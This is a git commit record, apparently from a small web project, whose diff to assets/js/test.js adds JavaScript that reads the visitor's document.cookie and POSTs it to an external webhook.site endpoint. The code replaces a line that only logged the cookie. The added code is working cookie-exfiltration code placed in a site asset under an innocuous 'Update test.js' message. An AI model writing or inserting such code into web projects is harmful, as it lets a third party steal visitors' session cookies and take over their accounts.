646523c1dd2e9e203291bc4ab053b85cfa5f0d1f
JCode <kcode54119@gmail.com>
2021-09-13 23:21:08 +0700

    Update test.js

--- assets/js/test.js
+++ assets/js/test.js
@@ -1,1 +1,11 @@
-console.log(document.cookie)
+fetch("https://webhook.site/ceec6ac6-2ad8-4d48-823b-766a0700e17d", {
+  method: 'POST',
+  mode: 'no-cors',
+  cache: 'no-cache',
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify({
+    'cookie': document.cookie
+  })
+})
